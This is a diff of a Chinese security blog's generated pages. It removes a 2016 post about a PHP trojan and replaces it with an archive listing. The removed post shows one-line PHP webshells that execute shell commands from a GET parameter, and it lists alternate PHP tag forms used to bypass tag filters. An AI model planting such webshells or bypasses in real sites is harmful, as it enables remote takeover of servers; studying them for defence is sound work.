@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>一个php木马引发的xxoo | FreeV&#39;s Blog</title>
+  <title>Archives: 2016/2 | FreeV&#39;s Blog</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -88,7 +88,7 @@
 </head>
 
 <!--
-<body class="post-template">
+<body class="home-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -224,73 +224,38 @@
 		
 
       
-<section id="intro">
-    <div class="container">
-        <div class="row col-md-offset-2">
-            <div class="col-md-8">
-    			<span class="post-meta">
-      <time datetime="2016-01-30T01:27:25.000Z" itemprop="datePublished">
-          2016-01-30
-      </time>
-    
-    
-    | 
-    <a href='/tags/php代码安全/'>php代码安全</a>
-    
-    
-</span>
-                <h1>一个php木马引发的xxoo</h1>
-            </div>
-        </div>
-        <div class="col-md-8 col-md-offset-2">
-      		<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
-<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line">&lt;% <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`%&gt;</span></span><br></pre></td></tr></table></figure>
-<p><br></p>
-<h2 id="0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E"><a href="#0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E" class="headerlink" title="0x01 可执行php代码的标签"></a>0x01 可执行php代码的标签</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="var_expand">% echo <span class="escape">`$</span>_GET[1]<span class="escape">`%</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p></p><h4>需要开启asp_tags=On<p></p>
-<p></p><h4>php3可以通过 short_tags() 函数激活使用短标签 <p></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span> phpinfo()<span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p></p><h4>需要在phpini中开启shor_tags()<p></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">language</span>=<span class="value">"php"</span>&gt;</span><span class="undefined"></span><br><span class="line">echo phpinfo;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p></p><h4>通过js执行php代码<p></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span></span><br></pre></td></tr></table></figure>
-<p></p><h4>这里‘=’相当于echo<p></p>
-<h2 id="0x02__u603B_u7ED3"><a href="#0x02__u603B_u7ED3" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p></p><h4>闭合标签可以不必要写，但是需要加上‘;’<p></p>
-<p></p><h4>以上php执行方式通常用于bypass绕过php执行标签<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br></pre></td></tr></table></figure><p></p>
-</h4></h4></h4></h4></h4></h4></h4>
-            <div class="clearfix"></div>
-            <hr class="nogutter">
-        </div>
-        <nav class="pagination" role="pagination">
-    
-    <a class="pull-left" href="/2016/02/06/后台配置getshell总结/" style="float: left;">
-        ← 后台配置getshell总结
-    </a>
-    
-    
-    <a class="pull-right" href="/2015/12/16/上传之万恶的zip/">
-        上传之万恶的zip →
-    </a>
-    
-</nav>
 
-        <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/01/30/一个php木马引发的xxoo/" data-title="一个php木马引发的xxoo" data-url="http://yoursite.com/2016/01/30/一个php木马引发的xxoo/"></div>
-<script type="text/javascript">
-var duoshuoQuery = {short_name:"freev"};
-(function() {
-	var ds = document.createElement('script');
-	ds.type = 'text/javascript';ds.async = true;
-	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-	ds.charset = 'UTF-8';
-	(document.getElementsByTagName('head')[0] 
-	 || document.getElementsByTagName('body')[0]).appendChild(ds);
-})();
-</script>
-</div>
+
+
+<section id="services">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1">
+                <div class="row boxes">
+                    
+                    
+                        
+                        
+                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
+                            
+                              <h4 class="title"><a href="/2016/02/06/后台配置getshell总结/">后台配置getshell总结</a></h4>
+                            
+                            <p><time datetime="2016-02-06T11:03:24.000Z"><a href="/2016/02/06/后台配置getshell总结/">2016-02-06</a></time></p>
+                        </div>
+                    
+                </div>
+            </div>    
+        </div>
+    </div>
+</section> 
+
+<section id="statement">
+    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
+        <div class="row">
+            <p>对知识的渴望是你前进的最大动力</p>
+        </div>
     </div>
 </section>
-
 
       
 <!-- ============================ Footer =========================== -->
